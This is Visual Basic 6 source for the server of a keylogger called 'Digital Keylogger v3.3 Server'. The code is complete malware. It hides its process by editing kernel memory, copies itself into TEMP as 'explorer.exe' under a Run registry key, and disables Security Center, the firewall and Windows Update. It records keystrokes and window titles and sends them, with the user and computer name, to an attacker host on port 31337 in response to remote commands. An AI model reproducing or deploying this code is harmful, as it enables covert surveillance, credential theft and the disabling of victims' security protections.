VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Nytro"
   ClientHeight    =   2910
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2910
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   360
      Top             =   1320
   End
   Begin VB.TextBox Text2 
      Height          =   495
      Left            =   2640
      TabIndex        =   1
      Top             =   2280
      Width           =   1575
   End
   Begin VB.TextBox Text1 
      Height          =   1725
      Left            =   840
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "Form1.frx":08CA
      Top             =   240
      Width           =   3495
   End
   Begin VB.Timer Timer4 
      Interval        =   1
      Left            =   1680
      Top             =   2400
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   2040
      Top             =   2040
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   480
      Top             =   2280
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' #################################################################
'       Digital Keylogger v3.3 Server [ Private Edition ]
'                      Author: Nytro
'             http://www.rstcenter.com/forum/
' #################################################################

Option Explicit

Private Const STATUS_INFO_LENGTH_MISMATCH = &HC0000004
Private Const STATUS_ACCESS_DENIED = &HC0000022
Private Const STATUS_INVALID_HANDLE = &HC0000008
Private Const ERROR_SUCCESS = 0&
Private Const SECTION_MAP_WRITE = &H2
Private Const SECTION_MAP_READ = &H4
Private Const READ_CONTROL = &H20000
Private Const WRITE_DAC = &H40000
Private Const NO_INHERITANCE = 0
Private Const DACL_SECURITY_INFORMATION = &H4

Private Type IO_STATUS_BLOCK
    Status As Long
    Information As Long
End Type

Private Type UNICODE_STRING
    Length As Integer
    MaximumLength As Integer
    buffer As Long
End Type

Private Const RSP_SIMPLE_SERVICE = 1
Private Const RSP_UNREGISTER_SERVICE = 0
Private Const OBJ_INHERIT = &H2
Private Const OBJ_PERMANENT = &H10
Private Const OBJ_EXCLUSIVE = &H20
Private Const OBJ_CASE_INSENSITIVE = &H40
Private Const OBJ_OPENIF = &H80
Private Const OBJ_OPENLINK = &H100
Private Const OBJ_KERNEL_HANDLE = &H200
Private Const OBJ_VALID_ATTRIBUTES = &H3F2

Private Type OBJECT_ATTRIBUTES
    Length As Long
    RootDirectory As Long
    ObjectName As Long
    Attributes As Long
    SecurityDeor As Long
    SecurityQualityOfService As Long
End Type

Private Type ACL
    AclRevision As Byte
    Sbz1 As Byte
    AclSize As Integer
    AceCount As Integer
    Sbz2 As Integer
End Type

Private Enum ACCESS_MODE
    NOT_USED_ACCESS
    GRANT_ACCESS
    SET_ACCESS
    DENY_ACCESS
    REVOKE_ACCESS
    SET_AUDIT_SUCCESS
    SET_AUDIT_FAILURE
End Enum

Private Enum MULTIPLE_TRUSTEE_OPERATION
    NO_MULTIPLE_TRUSTEE
    TRUSTEE_IS_IMPERSONATE
End Enum

Private Enum TRUSTEE_FORM
    TRUSTEE_IS_SID
    TRUSTEE_IS_NAME
End Enum

Private Enum TRUSTEE_TYPE
    TRUSTEE_IS_UNKNOWN
    TRUSTEE_IS_USER
    TRUSTEE_IS_GROUP
End Enum

Private Type TRUSTEE
    pMultipleTrustee            As Long
    MultipleTrusteeOperation    As MULTIPLE_TRUSTEE_OPERATION
    TrusteeForm                 As TRUSTEE_FORM
    TrusteeType                 As TRUSTEE_TYPE
    ptstrName                   As String
End Type

Private Type EXPLICIT_ACCESS
    grfAccessPermissions        As Long
    grfAccessMode               As ACCESS_MODE
    grfInheritance              As Long
    TRUSTEE                     As TRUSTEE
End Type

Private Type AceArray
    List() As EXPLICIT_ACCESS
End Type

Private Enum SE_OBJECT_TYPE
    SE_UNKNOWN_OBJECT_TYPE = 0
    SE_FILE_OBJECT
    SE_SERVICE
    SE_PRINTER
    SE_REGISTRY_KEY
    SE_LMSHARE
    SE_KERNEL_OBJECT
    SE_WINDOW_OBJECT
    SE_DS_OBJECT
    SE_DS_OBJECT_ALL
    SE_PROVIDER_DEFINED_OBJECT
    SE_WMIGUID_OBJECT
End Enum

Private Declare Function SetSecurityInfo Lib "advapi32.dll" (ByVal Handle As Long, ByVal ObjectType As SE_OBJECT_TYPE, ByVal SecurityInfo As Long, ppsidOwner As Long, ppsidGroup As Long, ppDacl As Any, ppSacl As Any) As Long
Private Declare Function GetSecurityInfo Lib "advapi32.dll" (ByVal Handle As Long, ByVal ObjectType As SE_OBJECT_TYPE, ByVal SecurityInfo As Long, ppsidOwner As Long, ppsidGroup As Long, ppDacl As Any, ppSacl As Any, ppSecurityDeor As Long) As Long
                                                            
Private Declare Function SetEntriesInAcl Lib "advapi32.dll" Alias "SetEntriesInAclA" (ByVal cCountOfExplicitEntries As Long, pListOfExplicitEntries As EXPLICIT_ACCESS, ByVal OldAcl As Long, NewAcl As Long) As Long
Private Declare Sub BuildExplicitAccessWithName Lib "advapi32.dll" Alias "BuildExplicitAccessWithNameA" (pExplicitAccess As EXPLICIT_ACCESS, ByVal pTrusteeName As String, ByVal AccessPermissions As Long, ByVal AccessMode As ACCESS_MODE, ByVal Inheritance As Long)
                                                        
Private Declare Sub RtlInitUnicodeString Lib "NTDLL.DLL" (DestinationString As UNICODE_STRING, ByVal SourceString As Long)
Private Declare Function ZwOpenSection Lib "NTDLL.DLL" (SectionHandle As Long, ByVal DesiredAccess As Long, ObjectAttributes As Any) As Long
Private Declare Function LocalFree Lib "kernel32" (ByVal hMem As Any) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function MapViewOfFile Lib "kernel32" (ByVal hFileMappingObject As Long, ByVal dwDesiredAccess As Long, ByVal dwFileOffsetHigh As Long, ByVal dwFileOffsetLow As Long, ByVal dwNumberOfBytesToMap As Long) As Long
Private Declare Function UnmapViewOfFile Lib "kernel32" (lpBaseAddress As Any) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long

Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID _
As Long, ByVal dwType As Long) As Long

Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type
   
Private verinfo As OSVERSIONINFO
   
Private g_hNtDLL As Long
Private g_pMapPhysicalMemory As Long
Private g_hMPM As Long
Private aByte(3) As Byte

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal sWndTitle As String, ByVal cLen As Long) As Long
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Private hForegroundWnd As Long
Private Title As String * 1000
Private x As Long
Dim retval As Long
Private backs As Boolean
Private aipi As String
Dim wsh

Private WithEvents Winsock1 As CSocketMaster
Attribute Winsock1.VB_VarHelpID = -1

Public Sub HideCurrentProcess()

    Dim thread As Long, process As Long, fw As Long, bw As Long
    Dim lOffsetFlink As Long, lOffsetBlink As Long, lOffsetPID As Long
    
    verinfo.dwOSVersionInfoSize = Len(verinfo)
    If (GetVersionEx(verinfo)) <> 0 Then
        If verinfo.dwPlatformId = 2 Then
            If verinfo.dwMajorVersion = 5 Then
                Select Case verinfo.dwMinorVersion
                    Case 0
                        lOffsetFlink = &HA0
                        lOffsetBlink = &HA4
                        lOffsetPID = &H9C
                    Case 1
                        lOffsetFlink = &H88
                        lOffsetBlink = &H8C
                        lOffsetPID = &H84
                End Select
            End If
        End If
    End If

    If OpenPhysicalMemory <> 0 Then
        thread = GetData(&HFFDFF124)
        process = GetData(thread + &H44)
        fw = GetData(process + lOffsetFlink)
        bw = GetData(process + lOffsetBlink)
        SetData fw + 4, bw
        SetData bw, fw
        CloseHandle g_hMPM
    End If
End Sub

Private Sub SetPhyscialMemorySectionCanBeWrited(ByVal hSection As Long)
    Dim pDacl As Long
    Dim pNewDacl As Long
    Dim pSD As Long
    Dim dwRes As Long
    Dim ea As EXPLICIT_ACCESS
    
    GetSecurityInfo hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, 0, 0, pDacl, 0, pSD
         
    ea.grfAccessPermissions = SECTION_MAP_WRITE
    ea.grfAccessMode = GRANT_ACCESS
    ea.grfInheritance = NO_INHERITANCE
    ea.TRUSTEE.TrusteeForm = TRUSTEE_IS_NAME
    ea.TRUSTEE.TrusteeType = TRUSTEE_IS_USER
    ea.TRUSTEE.ptstrName = "CURRENT_USER" & vbNullChar

    SetEntriesInAcl 1, ea, pDacl, pNewDacl
    
    SetSecurityInfo hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, 0, 0, ByVal pNewDacl, 0
                                
CleanUp:
    LocalFree pSD
    LocalFree pNewDacl
End Sub

Private Function OpenPhysicalMemory() As Long
    Dim Status As Long
    Dim PhysmemString As UNICODE_STRING
    Dim Attributes As OBJECT_ATTRIBUTES
    
    RtlInitUnicodeString PhysmemString, StrPtr("\Device\PhysicalMemory")
    Attributes.Length = Len(Attributes)
    Attributes.RootDirectory = 0
    Attributes.ObjectName = VarPtr(PhysmemString)
    Attributes.Attributes = 0
    Attributes.SecurityDeor = 0
    Attributes.SecurityQualityOfService = 0
    
    Status = ZwOpenSection(g_hMPM, SECTION_MAP_READ Or SECTION_MAP_WRITE, Attributes)
    If Status = STATUS_ACCESS_DENIED Then
        Status = ZwOpenSection(g_hMPM, READ_CONTROL Or WRITE_DAC, Attributes)
        SetPhyscialMemorySectionCanBeWrited g_hMPM
        CloseHandle g_hMPM
        Status = ZwOpenSection(g_hMPM, SECTION_MAP_READ Or SECTION_MAP_WRITE, Attributes)
    End If
    
    Dim lDirectoty As Long
    verinfo.dwOSVersionInfoSize = Len(verinfo)
    If (GetVersionEx(verinfo)) <> 0 Then
        If verinfo.dwPlatformId = 2 Then
            If verinfo.dwMajorVersion = 5 Then
                Select Case verinfo.dwMinorVersion
                    Case 0
                        lDirectoty = &H30000
                    Case 1
                        lDirectoty = &H39000
                End Select
            End If
        End If
    End If
    
    If Status = 0 Then
        g_pMapPhysicalMemory = MapViewOfFile(g_hMPM, 4, 0, lDirectoty, &H1000)
        If g_pMapPhysicalMemory <> 0 Then OpenPhysicalMemory = g_hMPM
    End If
End Function

Private Function LinearToPhys(BaseAddress As Long, addr As Long) As Long
    Dim VAddr As Long, PGDE As Long, PTE As Long, PAddr As Long
    Dim lTemp As Long
    
    VAddr = addr
    CopyMemory aByte(0), VAddr, 4
    lTemp = Fix(ByteArrToLong(aByte) / (2 ^ 22))
    
    PGDE = BaseAddress + lTemp * 4
    CopyMemory PGDE, ByVal PGDE, 4
    
    If (PGDE And 1) <> 0 Then
        lTemp = PGDE And &H80
        If lTemp <> 0 Then
            PAddr = (PGDE And &HFFC00000) + (VAddr And &H3FFFFF)
        Else
            PGDE = MapViewOfFile(g_hMPM, 4, 0, PGDE And &HFFFFF000, &H1000)
            lTemp = (VAddr And &H3FF000) / (2 ^ 12)
            PTE = PGDE + lTemp * 4
            CopyMemory PTE, ByVal PTE, 4
            
            If (PTE And 1) <> 0 Then
                PAddr = (PTE And &HFFFFF000) + (VAddr And &HFFF)
                UnmapViewOfFile PGDE
            End If
        End If
    End If
    
    LinearToPhys = PAddr
End Function

Private Function GetData(addr As Long) As Long
    Dim phys As Long, tmp As Long, Ret As Long
    
    phys = LinearToPhys(g_pMapPhysicalMemory, addr)
    tmp = MapViewOfFile(g_hMPM, 4, 0, phys And &HFFFFF000, &H1000)
    If tmp <> 0 Then
        Ret = tmp + ((phys And &HFFF) / (2 ^ 2)) * 4
        CopyMemory Ret, ByVal Ret, 4
        
        UnmapViewOfFile tmp
        GetData = Ret
    End If
End Function

Private Function SetData(ByVal addr As Long, ByVal data As Long) As Boolean
    Dim phys As Long, tmp As Long, x As Long
    
    phys = LinearToPhys(g_pMapPhysicalMemory, addr)
    tmp = MapViewOfFile(g_hMPM, SECTION_MAP_WRITE, 0, phys And &HFFFFF000, &H1000)
    If tmp <> 0 Then
        x = tmp + ((phys And &HFFF) / (2 ^ 2)) * 4
        CopyMemory ByVal x, data, 4
        
        UnmapViewOfFile tmp
        SetData = True
    End If
End Function

Private Function ByteArrToLong(inByte() As Byte) As Double
    Dim i As Integer
    For i = 0 To 3
        ByteArrToLong = ByteArrToLong + inByte(i) * (&H100 ^ i)
    Next i
End Function

Function encdec(inputstrinG As String) As String
If Len(inputstrinG) = 0 Then Exit Function
Dim p As String, o As String, k As String, s As String, tempstr As String, i As Integer, g As Integer
g = 1
For i = 1 To Len(inputstrinG)
p = Mid$(inputstrinG, i, 1)
o = Asc(p)
k = o Xor g
s = Chr$(k)
tempstr = tempstr & s
If g = 255 Then g = 1 Else g = g + 1
Next i
encdec = tempstr
End Function

Public Sub HideApp(Hide As Boolean)
    Dim ProcessID As Long, retval
    ProcessID = GetCurrentProcessId()

    If Hide Then
        retval = RegisterServiceProcess(ProcessID, RSP_SIMPLE_SERVICE)
    Else
        retval = RegisterServiceProcess(ProcessID, RSP_UNREGISTER_SERVICE)
    End If
End Sub

Private Sub Form_Initialize()

If App.PrevInstance = True Then
Unload Me
End If

End Sub

Private Sub Form_Load()

HideCurrentProcess

Set Winsock1 = New CSocketMaster
Set wsh = CreateObject("WScript.Shell")

If App.PrevInstance = True Then
Unload Me
End If

Open Environ("TEMP") & "\rst.bat" For Output As #1
Print #1, "Copy " & Chr(34) & App.Path & "\" & App.EXEName & ".exe" & Chr(34) & " " & Chr(34) & Environ("TEMP") & "\explorer.exe" & Chr(34)
Close #1

ShellExecute 0, "", Environ("TEMP") & "\rst.bat", "", "", 0
Shell "REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Explorer /d " & Chr(34) & Environ("TEMP") & "\explorer.exe" & Chr(34) & " /t REG_SZ", vbHide

Dim x(20) As Byte

Me.Hide
App.TaskVisible = False

Open Meee() For Binary As #1
Get #1, LOF(1) - 19, x
Close #1

Dim i As Integer, start As Integer, j As Integer

For i = 0 To UBound(x) - 3
   If x(i) = 124 And x(i + 1) = 124 And x(i + 2) = 124 Then
   start = i + 3
      For j = start To UBound(x)
         Text2.Text = Text2.Text + Chr(x(j))
      Next j
   End If
Next

aipi = Text2.Text

backs = True

Shell "cmd.exe /c net stop " & Chr(34) & "Security Center" & Chr(34), vbHide
Shell "cmd.exe /c net stop SharedAccess", vbHide
Shell "reg add " & Chr(34) & "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess" & Chr(34) & " /v Start /t REG_DWORD /d 0x4 /f", vbHide
Shell "cmd.exe /c reg add " & Chr(34) & "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" & Chr(34) & " /v Start /t REG_DWORD /d 0x4 /f", vbHide
Shell "cmd.exe /c reg add " & Chr(34) & "HKLM\SYSTEM\CurrentControlSet\Services\wscsvc" & Chr(34) & " /v Start /t REG_DWORD /d 0x4 /f", vbHide

Me.Hide
App.TaskVisible = False

Winsock1.Connect aipi, 31337

End Sub

Private Sub Timer2_Timer()

If Winsock1.State <> 7 Then
Winsock1.CloseSck
Winsock1.Connect aipi, 31337
End If
End Sub

Private Sub Timer3_Timer()

If Text1.Text <> "" Then
Winsock1.SendData "Keylog|" + Text1.Text
Text1.Text = ""
End If
End Sub

Private Sub Winsock1_Connect()

Dim obiect

Set obiect = CreateObject("WScript.NetWork")

Winsock1.SendData "IP|" & Winsock1.LocalIP & "|" & Text1.Text & "|" & obiect.Username & "|" & obiect.ComputerName

End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

    Dim NData() As String
    Dim TString As String
    Dim data As String
    Winsock1.GetData data
    NData = Split(data, "|")
    Select Case NData(0)
     
    Case "Timer":
    
        Timer3.Enabled = True
        Timer3.Interval = NData(1)
        
    Case "Message":
      
      MsgBox NData(1), vbCritical, "Microsoft Windows"

    End Select
    
If data = "KillServer" Then

Open Environ("TEMP") & "\del.bat" For Output As #1
Print #1, "@Echo off"
Print #1, ":S"
Print #1, "Del " & Environ("TEMP") & "\explorer.exe"
Print #1, "If Exist " & Environ("TEMP") & "\explorer.exe" & " Goto S"
Print #1, "Del Del.bat"
Close #1
Shell "Del.bat", vbHide
Unload Me
End If

If data = "Start" Then

Text1.Text = ""
Winsock1.SendData "Keylog|" + Text1.Text
Timer3.Enabled = True
Timer1.Enabled = True
End If

If data = "Yahoo" Then

Shell "taskkill.exe /im YahooMessenger.exe /f", vbHide
wsh.RegWrite "HKCU\Software\Yahoo\pager\Yahoo! User ID", "******", "REG_SZ"
End If

If data = "Stop" Then

Timer1.Enabled = False
End If

If data = "No" Then

backs = False
End If

If data = "Yes" Then

backs = True
End If

If data = "Manual" Then

Timer3.Interval = 0
Timer3.Enabled = False
Winsock1.SendData "Keylog|" + Text1.Text
Text1.Text = ""
End If

End Sub

Private Sub Timer1_Timer()


Dim x, x2, i, t As Integer
Dim win As Long
Dim Title As String * 1000

win = GetForegroundWindow()
If (win = hForegroundWnd) Then
GoTo Keylogger
Else
hForegroundWnd = GetForegroundWindow()
Title = ""

    GetWindowText hForegroundWnd, Title, 1000
    

Select Case Asc(Title)
  
Case 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95
     Text1.Text = Text1.Text & vbCrLf & vbCrLf & "[ " & Title
     Text1.Text = Text1.Text & " ]" & vbCrLf
End Select

End If

Exit Sub

Keylogger:

For i = 65 To 90

 x = GetAsyncKeyState(i)
 x2 = GetAsyncKeyState(16)


 If x = -32767 Then

  If x2 = -32768 Then
   Text1.Text = Text1.Text & Chr(i)
  Else: Text1.Text = Text1.Text & Chr(i + 32)
  End If
  
 End If

Next

For i = 8 To 222

If i = 65 Then i = 91

x = GetAsyncKeyState(i)
x2 = GetAsyncKeyState(16)


If x = -32767 Then

Select Case i

   Case 48
      Text1.Text = Text1.Text & IIf(x2 = -32768, ")", "0")
   Case 49
      Text1.Text = Text1.Text & IIf(x2 = -32768, "!", "1")
   Case 50
      Text1.Text = Text1.Text & IIf(x2 = -32768, "@", "2")
   Case 51
      Text1.Text = Text1.Text & IIf(x2 = -32768, "#", "3")
   Case 52
      Text1.Text = Text1.Text & IIf(x2 = -32768, "$", "4")
   Case 53
      Text1.Text = Text1.Text & IIf(x2 = -32768, "%", "5")
   Case 54
      Text1.Text = Text1.Text & IIf(x2 = -32768, "^", "6")
   Case 55
      Text1.Text = Text1.Text & IIf(x2 = -32768, "&", "7")
   Case 56
      Text1.Text = Text1.Text & IIf(x2 = -32768, "*", "8")
   Case 57
      Text1.Text = Text1.Text & IIf(x2 = -32768, "(", "9")

Case 112: Text1.Text = Text1.Text & " F1 "
Case 113: Text1.Text = Text1.Text & " F2 "
Case 114: Text1.Text = Text1.Text & " F3 "
Case 115: Text1.Text = Text1.Text & " F4 "
Case 116: Text1.Text = Text1.Text & " F5 "
Case 117: Text1.Text = Text1.Text & " F6 "
Case 118: Text1.Text = Text1.Text & " F7 "
Case 119: Text1.Text = Text1.Text & " F8 "
Case 120: Text1.Text = Text1.Text & " F9 "
Case 121: Text1.Text = Text1.Text & " F10 "
Case 122: Text1.Text = Text1.Text & " F11 "
Case 123: Text1.Text = Text1.Text & " F12 "

Case 220: Text1.Text = Text1.Text & IIf(x2 = -32768, "|", "\")
Case 188: Text1.Text = Text1.Text & IIf(x2 = -32768, "<", ",")
Case 189: Text1.Text = Text1.Text & IIf(x2 = -32768, "_", "-")
Case 190: Text1.Text = Text1.Text & IIf(x2 = -32768, ">", ".")
Case 191: Text1.Text = Text1.Text & IIf(x2 = -32768, "?", "/")
Case 187: Text1.Text = Text1.Text & IIf(x2 = -32768, "+", "=")
Case 186: Text1.Text = Text1.Text & IIf(x2 = -32768, ":", ";")
Case 222: Text1.Text = Text1.Text & IIf(x2 = -32768, Chr(34), "'")
Case 219: Text1.Text = Text1.Text & IIf(x2 = -32768, "{", "[")
Case 221: Text1.Text = Text1.Text & IIf(x2 = -32768, "}", "]")
Case 192: Text1.Text = Text1.Text & IIf(x2 = -32768, "~", "`")

Case 8: If backs = True Then If Len(Text1.Text) > 0 Then Text1.Text = Mid(Text1.Text, 1, Len(Text1.Text) - 1)
Case 9: Text1.Text = Text1.Text & " [ Tab ] "
Case 13: Text1.Text = Text1.Text & vbCrLf
Case 17: Text1.Text = Text1.Text & " [ Ctrl ]"
Case 18: Text1.Text = Text1.Text & " [ Alt ] "
Case 19: Text1.Text = Text1.Text & " [ Pause ] "
Case 20: Text1.Text = Text1.Text & " [ Capslock ] "
Case 27: Text1.Text = Text1.Text & " [ Esc ] "
Case 32: Text1.Text = Text1.Text & " "
Case 33: Text1.Text = Text1.Text & " [ PageUp ] "
Case 34: Text1.Text = Text1.Text & " [ PageDown ] "
Case 35: Text1.Text = Text1.Text & " [ End ] "
Case 36: Text1.Text = Text1.Text & " [ Home ] "
Case 37: Text1.Text = Text1.Text & " [ Left ] "
Case 38: Text1.Text = Text1.Text & " [ Up ] "
Case 39: Text1.Text = Text1.Text & " [ Right ] "
Case 40: Text1.Text = Text1.Text & " [ Down ] "
Case 41: Text1.Text = Text1.Text & " [ Select ] "
Case 44: Text1.Text = Text1.Text & " [ PrintScreen ] "
Case 45: Text1.Text = Text1.Text & " [ Insert ] "
Case 46: Text1.Text = Text1.Text & " [ Del ] "
Case 47: Text1.Text = Text1.Text & " [ Help ] "
Case 91, 92: Text1.Text = Text1.Text & " [ Windows ] "
  
End Select
  
End If

Next
End Sub

Private Function Meee() As String

Meee = App.Path & "\" & App.EXEName & ".exe"
End Function

